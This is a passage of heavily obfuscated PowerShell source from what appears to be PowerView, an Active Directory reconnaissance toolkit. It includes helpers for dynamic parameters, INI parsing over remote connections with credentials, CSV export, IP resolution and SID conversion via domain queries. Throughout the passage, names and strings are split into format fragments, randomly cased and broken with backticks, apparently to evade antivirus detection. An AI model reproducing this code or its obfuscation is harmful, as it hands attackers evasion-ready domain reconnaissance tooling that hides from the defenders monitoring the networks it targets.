        [Parameter(vAluEfRoMPIPelInEbYPrOPeRTynAMe = ${T`RUe}, paRAmeTeRseTnAmE = "D`YnA`M`icPaRAMETEr")]
        [int]${po`SItI`on},

        [Parameter(vALUefROmpipElINeByPropeRtynAMe = ${Tr`Ue}, pAraMeteRsEtNAme = "dYna`MicpAra`MeT`er")]
        [string]${hEl`pMEsS`A`ge},

        [Parameter(vALUeFrOMpIPelINEbyproperTyNAMe = ${T`Rue}, PARAmEtersEtnaMe = "Dy`NA`MI`cpARaMeteR")]
        [switch]${doNtS`How},

        [Parameter(vALUeFromPipelINebypROpertynAMe = ${t`Rue}, paRaMetErsETNAME = "d`YnaMIcpArAm`eTER")]
        [switch]${VAl`UEfromP`IPElI`NE},

        [Parameter(valUEFROMpiPElinEbYPrOPertYNaME = ${T`RUe}, parAmEtersETnAMe = "DynaMicpaR`A`mEtER")]
        [switch]${V`A`LuefrO`MpI`p`eLinEBYpROPerTynaME},

        [Parameter(ValueFROmPiPELINeBypropeRTYNAmE = ${tr`UE}, ParamETErSETNamE = "dY`NA`mICPARam`ET`Er")]
        [switch]${va`lueFr`Om`REm`AI`NInGarGUMeN`TS},

        [Parameter(vaLuEFrompIpEliNeBYpRopertyNAME = ${TR`UE}, pARAMEteRSetNAme = "dY`N`AMICpAr`AmET`eR")]
        [string]${paRAm`eTers`Et`NA`ME} = "__Al`LpaR`AMEtE`R`S`eTS",

        [Parameter(valuEfrOmPipelinebYPROPeRTYNaMe = ${Tr`Ue}, PARamEtErSETNaMe = "D`YNAmiCPA`RAM`eTeR")]
        [switch]${aLLO`Wnu`LL},

        [Parameter(vALUefromPIpELineBYPrOpertYnaMe = ${tR`Ue}, paramEterSEtNaMe = "dyNAMiC`P`ARaME`TEr")]
        [switch]${A`L`LoWEm`PTysTR`I`NG},

        [Parameter(VAlUeFROMPiPeLiNEBYPRoPeRTynamE = ${tR`UE}, ParAmeTersETNAMe = "Dy`NaM`icpa`RaME`TeR")]
        [switch]${aLlO`WEm`pT`yCo`l`leCT`iOn},

        [Parameter(VAluefrOMPIPeliNEbYPrOpERTynamE = ${TR`Ue}, PARAMeTERsetNAme = "D`YNAM`i`CpARAMETER")]
        [switch]${v`AlID`At`enOtn`Ull},

        [Parameter(vAluEfROmPipelInEbYPrOPERtynaMe = ${tR`Ue}, PAraMETErSeTnAME = "dYn`Am`icp`A`RaMetEr")]
        [switch]${Va`lIDatenoTNuLl`O`R`eMp`TY},

        [Parameter(vALUEFrOMpIPeLiNEbYprOpertyNaMe = ${t`RUE}, parAMeTersEtnAME = "DYnAmIcPAr`A`METEr")]
        [ValidateCount(2,2)]
        [int[]]${v`ALID`Atec`O`UNT},

        [Parameter(VAlUeFROMpiPeLInEBYPropErtYNAmE = ${T`Rue}, pArAmetERSetnAme = "Dy`NAMICPA`RAme`T`eR")]
        [ValidateCount(2,2)]
        [int[]]${VAl`i`dATEr`An`Ge},

        [Parameter(ValUeFrOmpIPelINEbyPropErTynAmE = ${T`RUE}, parAmEtErsetNaMe = "DY`N`A`mIC`PAramEtEr")]
        [ValidateCount(2,2)]
        [int[]]${va`L`IdatE`lEnGTh},

        [Parameter(ValUEfRoMPIpELINEBYproPErtynamE = ${t`RUe}, PaRAMEteRSETnAmE = "Dy`Na`mI`CPArA`MeTer")]
        [ValidateNotNullOrEmpty()]
        [string]${V`A`li`dAt`Ep`AtTERn},

        [Parameter(VAlueFROmpipELInEBYpRopeRTYNAmE = ${Tr`Ue}, pArAmETERsEtNamE = "D`yN`AmI`CpARam`etER")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${V`ALID`ATEsCR`i`pt},

        [Parameter(VaLUeFRompIpelinebYprOPERtYnAMe = ${T`RUe}, ParamETersETNAmE = "DynA`mIC`p`ArAMet`ER")]
        [ValidateNotNullOrEmpty()]
        [string[]]${ValI`DA`TESeT},

        [Parameter(VAlUEfRoMPIpELIneByPROperTYName = ${tr`UE}, PaRAMeTerSetnAme = "DynAMiCpA`RaMe`T`ER")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{6}{1}{20}{16}{25}{26}{0}{5}{14}{10}{19}{3}{23}{11}{4}{13}{18}{24}{9}{2}{17}{21}{15}{7}{12}{8}{22}" -f'tem',' m','dParamete','toma','nt','.Manag','Dictionary','ar','objec','ine','ent','on.Ru','y ','im','em','n','e','rDict','eDe','.Au','ust b','io','t','ti','f',' a',' Sys')
            }
            ${T`Rue}
        })]
        ${dIc`TI`o`NARY} = ${F`AlSE},

        [Parameter(maNDAtory = ${t`Rue}, VALuEfrOmPIPELineBYproPerTyNaMe = ${tr`UE}, pArAmEteRseTname = "c`R`eaTevarI`ABLeS")]
        [switch]${CR`E`ATevArI`AbLeS},

        [Parameter(maNDaTory = ${tr`UE}, VALUEfROMpipelInebYPRoPErtynaME = ${t`RuE}, ParameTeRSeTnaMe = "CReAtE`Va`Ri`AbLES")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if(${_}.("{0}{1}" -f 'Ge','tType').Invoke()."NA`ME" -notmatch ("{0}{2}{1}"-f'Dict','ry','iona')) {
                Throw ("{18}{5}{16}{12}{21}{4}{0}{19}{20}{14}{11}{3}{15}{7}{10}{6}{9}{1}{13}{8}{17}{2}"-f'anagem','n','ct','ion.PSBoundP','e a System.M','undP','s','ramete','ry ','Dictio','r','t','ter','a','ma','a','arame','obje','Bo','ent.A','uto','s must b')
            }
            ${tr`Ue}
        })]
        ${boun`dP`ArAme`TE`Rs}
    )

    Begin {
        ${Inter`Nal`dIcTi`o`NA`Ry} = &("{0}{2}{1}"-f'New','ct','-Obje') -TypeName ("{6}{2}{11}{3}{0}{8}{9}{4}{5}{1}{7}{10}"-f 'omati','et','me','t','Defin','edParam','System.Manage','erDicti','on.Run','time','onary','nt.Au')
        function _`TEmP { [CmdletBinding()] Param() }
        ${Comm`oNp`A`RaMeterS} = (&("{1}{2}{0}"-f'mmand','Get-C','o') ("{0}{1}"-f '_t','emp'))."P`A`RamET`ERS"."K`Eys"
    }

    Process {
        if(${cREA`Tev`ArIaB`LeS}) {
            ${b`o`Und`KEyS} = ${BOuNdpa`Ra`M`eteRs}."Ke`Ys" | &("{0}{3}{2}{1}" -f 'Wher','ject','Ob','e-') { ${Co`m`MoN`paR`AmetERs} -notcontains ${_} }
            ForEach(${P`A`RameTER} in ${B`ouND`kE`ys}) {
                if (${PAR`AmE`Ter}) {
                    &("{3}{1}{2}{0}"-f 'ariable','-','V','Set') -Name ${pA`RAmE`TER} -Value ${bOu`N`Dp`A`RamETeRS}.${pA`R`AMETeR} -Scope 1 -Force
                }
            }
        }
        else {
            ${S`TA`LekeYS} = @()
            ${stA`LEk`EYS} = ${Ps`B`o`U`Ndpara`meters}.("{1}{2}{0}{3}" -f'ra','GetEnum','e','tor').Invoke() |
                        &("{2}{3}{0}{1}"-f'-Ob','ject','For','Each') {
                            if(${_}."Va`Lue"."PSoBJe`CT"."METH`O`Ds"."Na`mE" -match (('^Equa'+'l'+'sqk'+'b').("{0}{1}" -f'REplAC','e').Invoke('qkb','$'))) {
                                
                                if(!${_}."VA`lUe".("{1}{0}"-f 'uals','Eq').Invoke((&("{0}{3}{2}{1}" -f'Ge','le','iab','t-Var') -Name ${_}."k`eY" -ValueOnly -Scope 0))) {
                                    ${_}."k`Ey"
                                }
                            }
                            else {
                                
                                if(${_}."v`ALue" -ne (&("{0}{1}{2}" -f 'Get-Vari','abl','e') -Name ${_}."k`EY" -ValueOnly -Scope 0)) {
                                    ${_}."k`ey"
                                }
                            }
                        }
            if(${S`Ta`LEke`yS}) {
                ${STaLE`kE`yS} | &("{3}{1}{2}{0}{4}"-f 'ach-O','or','E','F','bject') {[void]${P`SBounDParA`mete`Rs}.("{1}{0}"-f 'e','Remov').Invoke(${_})}
            }

            
            ${uNbounD`PARaMeT`E`RS} = (&("{0}{2}{1}{3}" -f'Get-','ma','Com','nd') -Name (${pscMD`let}."MYI`NVo`cATI`oN"."iNvo`CAti`onNaME"))."pA`Ram`EterS".("{2}{1}{0}"-f'merator','etEnu','G').Invoke()  |
                                        
                                        &("{1}{0}{2}"-f're-Objec','Whe','t') { ${_}."v`AlUe"."PaRa`Me`TerSETS"."k`EYS" -contains ${p`SC`MdleT}.pArAmEtERseTnAme } |
                                            &("{2}{0}{1}" -f'le','ct-Object','Se') -ExpandProperty ("{1}{0}"-f'ey','K') |
                                                
                                                &("{0}{2}{1}" -f'Where','ject','-Ob') { ${psBouNDPArAM`E`TE`RS}."ke`Ys" -notcontains ${_} }

            
            ${T`mP} = ${nU`LL}
            ForEach (${Para`m`ETER} in ${u`N`B`ouNdpaRA`MetErS}) {
                ${d`e`FAuLTVAlUE} = &("{1}{0}{3}{2}"-f 't','Ge','ble','-Varia') -Name ${pAR`AMe`T`eR} -ValueOnly -Scope 0
                if(!${p`SBoU`Ndp`ArA`met`ERs}."TrY`gE`T`Value"(${pA`R`AmET`er}, [ref]${t`MP}) -and ${dE`FaUlT`VaLUE}) {
                    ${pSbouNdp`Ar`A`MEt`e`RS}.${PA`R`AMeTER} = ${D`EF`Au`Ltv`ALue}
                }
            }

            if(${di`ct`Ion`Ary}) {
                ${dPdi`cTi`on`A`Ry} = ${Di`cTI`OnA`RY}
            }
            else {
                ${d`pdiCtI`On`Ary} = ${i`N`TeRN`AlD`ic`TiOnARY}
            }

            
            ${g`ETVAr} = {&("{3}{2}{1}{0}"-f'able','ri','a','Get-V') -Name ${_} -ValueOnly -Scope 0}

            
            ${ATTr`Ib`Ut`ErEg`eX} = (('^('+'Mandato'+'ry'+'ElBPositionE'+'lBParame'+'terSetNam'+'eElB'+'Do'+'ntShowElBH'+'elp'+'Message'+'ElBValueFr'+'omPipel'+'ineElBV'+'alueFro'+'m'+'PipelineBy'+'Pr'+'op'+'erty'+'N'+'a'+'m'+'eElBVal'+'ueF'+'ro'+'mRe'+'mainin'+'gAr'+'g'+'um'+'e'+'nts)ft3')."rE`pLACe"(([CHAr]102+[CHAr]116+[CHAr]51),'$').("{0}{1}"-f'Re','PLACe').Invoke('ElB','|'))
            ${v`ALID`ATIonrEG`EX} = ((('^'+'(Allow'+'Nu'+'ll'+'T1yAl'+'lo'+'wEm'+'p'+'t'+'yStri'+'ngT1yAllo'+'wEmpt'+'yCollectionT1'+'y'+'Valida'+'te'+'Coun'+'tT1yVa'+'l'+'idate'+'LengthT1yV'+'a'+'lidate'+'Patte'+'rnT1yV'+'alid'+'ateRangeT1y'+'V'+'alidateSc'+'ri'+'ptT1yValida'+'t'+'eS'+'e'+'tT'+'1'+'yV'+'a'+'lidateNotNullT'+'1'+'y'+'Valida'+'teN'+'ot'+'NullOrEm'+'pty)K'+'UD') -CRepLace ([CHAR]75+[CHAR]85+[CHAR]68),[CHAR]36 -rePlAcE ([CHAR]84+[CHAR]49+[CHAR]121),[CHAR]124))
            ${ALia`SRE`GEx} = {('^'+'Alias'+'Jr'+'K')."R`EpL`ACe"(([CHAR]74+[CHAR]114+[CHAR]75),[sTriNg][CHAR]36)}
            ${PARamETE`Ra`TTRi`BUTE} = &("{0}{2}{1}{3}"-f 'New-','je','Ob','ct') -TypeName ("{8}{4}{0}{3}{1}{5}{10}{2}{7}{6}{9}"-f 'anageme','utomatio','a','nt.A','tem.M','n.','meterAttri','ra','Sys','bute','P')

            switch -regex (${PsBO`UNDp`ARa`mEters}."K`eYs") {
                ${AttR`iBU`Ter`EgEx} {
                    Try {
                        ${paRaME`TErA`TtriBu`Te}.${_} = . ${g`Etv`AR}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${dPD`ICti`o`NA`Ry}."ke`ys" -contains ${Na`me}) {
                ${dP`dI`CTioNAry}.${N`AME}."aTt`R`iBU`TEs".("{1}{0}" -f'd','Ad').Invoke(${paraMeT`ERAT`TR`ib`UTE})
            }
            else {
                ${ATT`Ri`B`UTE`colLeC`Tion} = &("{0}{1}{2}" -f'New-','Ob','ject') -TypeName ("{12}{7}{9}{15}{1}{0}{13}{5}{3}{2}{4}{14}{8}{11}{10}{6}" -f 'de','Mo','stem.At','ion[Sy','tr','llect',']','lect','b','ions.Obje','e','ut','Col','l.Co','i','ct')
                switch -regex (${psb`OuNdPARa`MET`eRs}."KE`yS") {
                    ${VAl`idaTI`ONRE`GEx} {
                        Try {
                            ${pARAme`T`EROPTIo`Ns} = &("{1}{0}{2}"-f 'b','New-O','ject') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${gEt`VAR}) -ErrorAction ("{0}{1}" -f 'S','top')
                            ${a`TTrI`BUtEc`O`LLecTIon}.("{0}{1}"-f'A','dd').Invoke(${pA`R`A`meTERopti`OnS})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${Alias`R`E`GEx} {
                        Try {
                            ${PArA`met`eraL`IAs} = &("{2}{0}{1}" -f 'bje','ct','New-O') -TypeName ("{1}{4}{6}{2}{0}{10}{5}{3}{7}{8}{9}"-f'eme','Sys','ag','utomation.Alia','tem.M','A','an','s','Attrib','ute','nt.') -ArgumentList (. ${GET`VAR}) -ErrorAction ("{1}{0}"-f'p','Sto')
                            ${att`RIbUTE`co`llECT`IOn}.("{1}{0}" -f 'd','Ad').Invoke(${PArAMeT`E`RaLI`As})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${atTRi`But`e`CoL`lecT`iOn}.("{0}{1}"-f 'A','dd').Invoke(${pA`Ram`ETe`RAtt`RibuTE})
                ${pAR`AmE`TeR} = &("{1}{2}{3}{0}" -f't','New-','Obj','ec') -TypeName ("{2}{5}{3}{6}{1}{8}{4}{0}{7}"-f 'nedParamete','mation.Runtime','System','ment.Aut','fi','.Manage','o','r','De') -ArgumentList @(${N`AmE}, ${Ty`PE}, ${a`T`TRibutE`cOllE`ctIOn})
                ${dpdi`CT`iO`NaRy}.("{0}{1}"-f 'A','dd').Invoke(${n`AME}, ${PA`Rame`TEr})
            }
        }
    }

    End {
        if(!${c`REa`TEVARIA`BlEs} -and !${dIC`TIO`N`ArY}) {
            ${dPdICTI`o`NA`RY}
        }
    }
}


function G`et-In`icO`NTENt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}" -f'PSShoul','ss','dPro','ce'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(PoSition = 0, MANdATory = ${tR`Ue}, vALUEFrOMpipelinE = ${Tr`UE}, VAlUefRoMPipElinebYpROPERTYnamE = ${Tr`UE})]
        [Alias({"{1}{0}{2}" -f'ullNam','F','e'}, {"{1}{0}" -f'me','Na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`Ath},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`DE`NtI`AL} =  (  GI vaRIaBLe:0DsQr).VALuE::"E`mpTY",

        [Switch]
        ${O`Ut`p`Ut`ObjeCt}
    )

    BEGIN {
        ${MAPp`edCOmpuT`ErS} = @{}
    }

    PROCESS {
        ForEach (${TA`RGeTp`ATH} in ${P`Ath}) {
            if ((${taRG`eTP`A`TH} -Match ((("{0}{1}{2}{4}{3}" -f '{0}{0}{0}{','0','}.*{0}','}.*','{0')) -f [chaR]92)) -and (${p`s`BOUN`DPAR`A`meterS}[("{0}{1}{3}{2}"-f 'Cred','en','al','ti')])) {
                ${hOST`C`Om`puT`ER} = (&("{0}{2}{1}"-f'Ne','t','w-Objec') ("{0}{1}{2}"-f 'Sy','stem.Ur','i')(${T`AR`gEtPa`Th}))."H`osT"
                if (-not ${mAP`PEDcomP`U`T`E`Rs}[${HOst`c`Om`pUTer}]) {
                    
                    &("{2}{4}{1}{0}{3}"-f'o','ti','Add-RemoteCon','n','nec') -ComputerName ${HOs`TC`OmPuTER} -Credential ${crE`De`NtI`AL}
                    ${MAp`PedCo`MP`UTe`RS}[${HosTCO`mPU`TER}] = ${t`RUE}
                }
            }

            if (&("{1}{2}{0}"-f'-Path','T','est') -Path ${TA`Rge`TPa`Th}) {
                if (${pSbO`U`ND`PAram`ETeRS}[("{2}{1}{0}" -f 'utObject','utp','O')]) {
                    ${IN`iO`B`jecT} = &("{0}{1}{2}"-f'New-O','bje','ct') ("{0}{2}{1}"-f 'PS','ect','Obj')
                }
                else {
                    ${inioB`je`ct} = @{}
                }
                Switch -Regex -File ${tarGE`TPa`Th} {
                    ((("{2}{0}{1}" -f '.','+)KJW]','^KJW[('))  -rePlAcE ([cHAr]75+[cHAr]74+[cHAr]87),[cHAr]92) 
                    {
                        ${S`e`Ction} = ${ma`T`cHES}[1].("{1}{0}"-f'im','Tr').Invoke()
                        if (${pSBOu`ND`P`ARam`eTeRs}[("{2}{1}{0}{3}" -f'bjec','utO','Outp','t')]) {
                            ${SECT`i`on} = ${sEc`TI`On}.("{1}{2}{0}"-f 'ce','Repl','a').Invoke(' ', '')
                            ${S`EcT`ion`oBJe`Ct} = &("{1}{2}{3}{0}" -f 'ct','Ne','w-Obj','e') ("{0}{1}"-f 'PS','Object')
                            ${inIo`Bj`ECt} | &("{2}{0}{1}" -f'd-','Member','Ad') ("{0}{1}{2}{3}"-f'Notep','r','op','erty') ${S`E`cTIoN} ${S`ecT`IOno`Bje`CT}
                        }
                        else {
                            ${iniO`BjE`cT}[${sE`c`TION}] = @{}
                        }
                        ${cO`MmE`NTco`UNT} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${v`A`luE} = ${M`At`cHES}[1].("{1}{0}" -f'rim','T').Invoke()
                        ${cOMm`E`NT`CoUNT} = ${Co`mmeN`T`CoU`Nt} + 1
                        ${Na`mE} = ("{0}{2}{1}" -f'C','mment','o') + ${c`o`MM`enTcoU`Nt}
                        if (${ps`Bo`Und`pa`RAMet`eRs}[("{1}{2}{0}" -f'ect','Ou','tputObj')]) {
                            ${N`AMe} = ${n`AmE}.("{0}{2}{1}" -f 'Repl','e','ac').Invoke(' ', '')
                            ${IN`iOb`jeCt}.${sE`CtION} | &("{0}{1}{2}"-f 'A','dd-M','ember') ("{1}{0}{2}" -f'pe','Notepro','rty') ${n`AMe} ${Val`Ue}
                        }
                        else {
                            ${i`Ni`OBject}[${S`ECt`ION}][${Na`ME}] = ${v`AluE}
                        }
                    }
                    ((("{0}{4}{3}{1}{2}" -f'(',')JhT','s*=(.*)','+?','.'))."re`P`LACe"('JhT',[sTriNg][ChAR]92)) 
                    {
                        ${N`AmE}, ${V`Alue} = ${M`AtCHeS}[1..2]
                        ${nA`ME} = ${N`AmE}.("{0}{1}" -f 'Tri','m').Invoke()
                        ${VaL`UES} = ${vAL`UE}.("{0}{1}" -f'sp','lit').Invoke(',') | &("{2}{1}{0}"-f 't','c','ForEach-Obje') { ${_}.("{1}{0}" -f'im','Tr').Invoke() }

                        

                        if (${pSBOuNd`pArAme`T`Ers}[("{1}{2}{3}{0}"-f 'bject','Ou','t','putO')]) {
                            ${N`Ame} = ${N`AMe}.("{0}{1}"-f'Repla','ce').Invoke(' ', '')
                            ${i`NioBje`ct}.${sect`ioN} | &("{2}{0}{1}" -f'd-Membe','r','Ad') ("{1}{0}{2}"-f 't','No','eproperty') ${Na`mE} ${V`Alues}
                        }
                        else {
                            ${Inio`Bje`CT}[${Sect`I`On}][${n`Ame}] = ${vAlU`Es}
                        }
                    }
                }
                ${i`NioBJe`CT}
            }
        }
    }

    END {
        
        ${MAPP`e`dcOMPuTErs}."Ke`yS" | &("{4}{6}{0}{2}{3}{1}{5}" -f 'R','ecti','emoteCon','n','Remov','on','e-')
    }
}


function eX`PoR`T-POwErvi`E`W`CsV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f'ce','PSShoul','ss','dPro'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(MandaTorY = ${tr`Ue}, valUEFrOmpipelinE = ${Tr`UE}, VALUefROMPipElinEbyPrOPERTYnAme = ${T`RUE})]
        [System.Management.Automation.PSObject[]]
        ${INpUtoB`J`ECt},

        [Parameter(MaNdATorY = ${TR`Ue}, PoSition = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${p`ATH},

        [Parameter(pOsitiOn = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${D`elim`iter} = ',',

        [Switch]
        ${Ap`p`end}
    )

    BEGIN {
        ${O`Utp`UtP`ATh} =   (  DIR  ('varIablE:4'+'W'+'A'+'1') ).VaLuE::"GE`TFuLlP`AtH"(${PSb`oun`dpa`Ra`mE`TerS}[("{0}{1}"-f 'Pa','th')])
        ${Ex`IstS} =  $DMH::("{1}{0}{2}" -f 'xi','E','sts').Invoke(${out`P`UtpATh})

        
        ${muT`EX} = &("{2}{0}{1}" -f'w-O','bject','Ne') ("{1}{2}{0}{3}{4}{5}{6}" -f 'hr','System','.T','ea','ding.Mu','te','x') ${F`A`Lse},("{1}{2}{0}"-f 'ex','CS','VMut')
        ${nu`Ll} = ${MUt`EX}.("{1}{0}"-f 'tOne','Wai').Invoke()

        if (${P`S`BoUnDPAra`MEtErS}[("{1}{0}"-f'end','App')]) {
            ${F`ilEM`ode} =  $2thyZ5::"a`ppE`Nd"
        }
        else {
            ${Fi`LemO`De} =  (get-vaRIable 2tHyZ5).vaLUe::"CRe`Ate"
            ${EXiS`Ts} = ${F`AL`sE}
        }

        ${CSVs`T`Re`AM} = &("{1}{0}{2}{3}" -f'-','New','Obje','ct') ("{0}{1}{2}"-f 'IO.Fi','l','eStream')(${outP`UtP`AtH}, ${fI`l`eMODE},  ( VARiABle  ('dj4'+'P') -ValueoNlY )::"W`RItE",  ( GeT-VAriABLe  ('63a7'+'o')).vALuE::"RE`AD")
        ${cS`V`wRiter} = &("{1}{0}{2}" -f'w-Obje','Ne','ct') ("{0}{2}{1}{3}{5}{4}"-f 'System','.','.IO','Stre','riter','amW')(${c`s`VSt`ReaM})
        ${C`s`V`wriTER}."a`UtO`FluSh" = ${t`Rue}
    }

    PROCESS {
        ForEach (${en`Try} in ${InPuTo`B`jeCT}) {
            ${OB`jeC`TCSV} = &("{3}{0}{2}{1}" -f 't','Csv','To-','Conver') -InputObject ${eN`T`Ry} -Delimiter ${d`ElimI`TEr} -NoTypeInformation

            if (-not ${e`Xis`Ts}) {
                
                ${ObJEc`TC`SV} | &("{1}{2}{3}{0}"-f'Object','For','E','ach-') { ${CS`V`W`RITER}.("{2}{1}{0}"-f'ne','riteLi','W').Invoke(${_}) }
                ${E`XISTs} = ${Tr`UE}
            }
            else {
                
                ${O`BJE`ctcsv}[1..(${oBJE`cT`CSv}."LenG`Th"-1)] | &("{2}{0}{1}" -f'O','bject','ForEach-') { ${c`SvWr`iTer}.("{0}{2}{1}" -f'Writ','e','eLin').Invoke(${_}) }
            }
        }
    }

    END {
        ${MUt`eX}.("{2}{0}{1}"-f'eMute','x','Releas').Invoke()
        ${C`svWr`Iter}.("{1}{0}" -f 'spose','Di').Invoke()
        ${Cs`VSt`R`eam}.("{2}{1}{0}" -f 'e','os','Disp').Invoke()
    }
}


function R`e`sOl`V`e-ipAd`dreSs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}" -f 'r','ocess','PSS','houldP'}, '')]
    [OutputType({"{1}{7}{2}{4}{8}{3}{5}{6}{0}"-f 'ect','S','tem','ment.Auto','.Manag','mation.PSCus','tomObj','ys','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItiON = 0, vALuEfrompIpELInE = ${t`RUe}, vaLUeFromPipELiNeBYprOPErtynaMe = ${TR`UE})]
        [Alias({"{2}{1}{0}" -f 'stName','o','H'}, {"{2}{3}{1}{0}"-f'ame','stn','dns','ho'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`MpUter`N`AMe} = ${ENv`:com`pUtEr`N`A`Me}
    )

    PROCESS {
        ForEach (${co`m`puTeR} in ${C`OmP`UTErN`Ame}) {
            try {
                @(( $5K1BtM::("{2}{1}{0}{3}" -f'tHost','e','G','Entry').Invoke(${comP`Ut`er}))."ADdre`s`slI`sT") | &("{4}{2}{1}{0}{3}" -f'e','j','rEach-Ob','ct','Fo') {
                    if (${_}."A`ddRe`SS`FamilY" -eq ("{1}{0}{2}" -f'Netw','Inter','ork')) {
                        ${o`Ut} = &("{0}{1}{3}{2}" -f'New-','Ob','t','jec') ("{1}{0}"-f 'bject','PSO')
                        ${o`UT} | &("{1}{3}{2}{0}"-f'mber','Ad','-Me','d') ("{0}{1}{2}" -f 'Noteprop','ert','y') ("{2}{0}{3}{1}" -f'uter','me','Comp','Na') ${C`oM`puter}
                        ${O`Ut} | &("{3}{2}{0}{1}"-f'be','r','m','Add-Me') ("{1}{0}{2}" -f'oper','Notepr','ty') ("{1}{2}{0}" -f'dress','I','PAd') ${_}."ip`Ad`d`REsSTOSTrinG"
                        ${o`UT}
                    }
                }
            }
            catch {
                &("{0}{3}{2}{1}"-f 'Wri','ose','e-Verb','t') ('[Re'+'solve-I'+'PAddr'+'ess'+'] '+'Cou'+'ld'+' '+'not'+' '+'r'+'eso'+'lve '+"$Computer "+'to'+' '+'a'+'n '+'IP'+' '+'Add'+'res'+'s.')
            }
        }
    }
}


function co`N`VERTtO`-`SID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{0}{2}" -f'es','SShouldPro','s','P','c'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mAnDATOrY = ${T`RuE}, vALuEFrOmpiPEliNe = ${T`RUe}, VAlUeFRomPIPelINebYprOPErTyNAme = ${tr`Ue})]
        [Alias({"{0}{1}"-f'Nam','e'}, {"{0}{2}{1}" -f 'Id','ty','enti'})]
        [String[]]
        ${objeCTn`A`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{5}{4}{1}{2}"-f'Do','olle','r','mai','ontr','nC'})]
        [String]
        ${Se`RveR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDe`NtIal} =  $0DSQr::"E`mpty"
    )

    BEGIN {
        ${d`OMA`InsEaRchErArGU`MEN`TS} = @{}
        if (${p`S`Bou`NDPa`RAMEtErS}[("{1}{0}"-f'n','Domai')]) { ${DomAi`NSear`C`H`eRArGuMeNTs}[("{0}{1}" -f'Doma','in')] = ${D`o`MaiN} }
        if (${PsB`o`Un`Dp`ARaMEterS}[("{2}{1}{0}" -f 'r','erve','S')]) { ${dOM`AiNSEAR`cH`ErARG`UmenTS}[("{1}{0}"-f'er','Serv')] = ${SE`RvER} }
        if (${Ps`BoU`NDp`AR`Amet`ERs}[("{3}{0}{1}{2}"-f 're','denti','al','C')]) { ${Do`m`Ai`NS`eARChE`RArgUME`NTs}[("{2}{0}{1}{3}" -f 'e','nt','Cred','ial')] = ${CR`EDENtI`AL} }
    }

    PROCESS {
        ForEach (${O`Bje`CT} in ${o`BJ`E`CTname}) {
            ${OBJE`CT} = ${o`Bj`ECT} -Replace '/','\'

            if (${PSBoU`NDP`A`Ram`ETerS}[("{1}{0}{2}" -f'rede','C','ntial')]) {
                ${DN} = &("{2}{1}{0}{3}" -f'vert-','n','Co','ADName') -Identity ${OBj`E`Ct} -OutputType 'DN' @DomainSearcherArguments
                if (${d`N}) {
                    ${u`SeRDO`MAin} = ${D`N}.("{0}{2}{1}"-f'S','bString','u').Invoke(${d`N}.("{0}{1}" -f 'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    ${U`seRN`AmE} = ${d`N}.("{0}{1}"-f'S','plit').Invoke(',')[0].("{1}{0}" -f 't','spli').Invoke('=')[1]

                    ${DOMaI`N`sE`Arc`he`RARGU`MENTs}[("{0}{1}{2}" -f 'Id','ent','ity')] = ${us`er`NAME}
                    ${dOma`in`seA`RChEr`AR`gume`NTs}[("{1}{0}{2}"-f 'o','D','main')] = ${USE`R`d`OmAIN}
                    ${do`mA`IN`seArcH`ErArGume`Nts}[("{1}{0}{2}"-f 'r','P','operties')] = ("{1}{0}" -f 'ectsid','obj')
                    &("{4}{0}{3}{2}{1}"-f 'et-Do','ect','Obj','main','G') @DomainSearcherArguments | &("{0}{2}{1}{3}{4}"-f 'Selec','bj','t-O','ec','t') -Expand ("{0}{1}"-f'obj','ectsid')
                }
            }
            else {
                try {
                    if (${o`B`JECT}.("{2}{0}{1}" -f'tain','s','Con').Invoke('\')) {
                        ${DO`maIn} = ${obJe`ct}.("{1}{0}"-f't','Spli').Invoke('\')[0]
                        ${ObjE`cT} = ${O`BJe`CT}.("{1}{0}" -f't','Spli').Invoke('\')[1]
                    }
                    elseif (-not ${PSB`oun`dpaRAmE`T`erS}[("{1}{2}{0}"-f 'n','Do','mai')]) {
                        ${DoMaINsEARcH`erA`RguMe`N`Ts} = @{}
                        ${D`Om`Ain} = (&("{2}{1}{0}{3}" -f 'D','t-','Ge','omain') @DomainSearcherArguments)."na`me"
                    }

                    ${O`Bj} = (&("{1}{2}{0}"-f'ct','New-O','bje') ("{0}{6}{1}{5}{7}{2}{4}{3}" -f'Sys','curity','pa','unt','l.NTAcco','.','tem.Se','Princi')(${D`Oma`IN}, ${oBJE`CT}))
                    ${o`Bj}."Tr`ANSL`ATE"([System.Security.Principal.SecurityIdentifier])."vAL`UE"
                }
                catch {
                    &("{1}{0}{2}"-f 'e-Ver','Writ','bose') ('[Conv'+'e'+'rtTo'+'-SI'+'D] '+'Er'+'ror '+'conver'+'tin'+'g '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}


function conV`ErT`FrO`m-sId {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
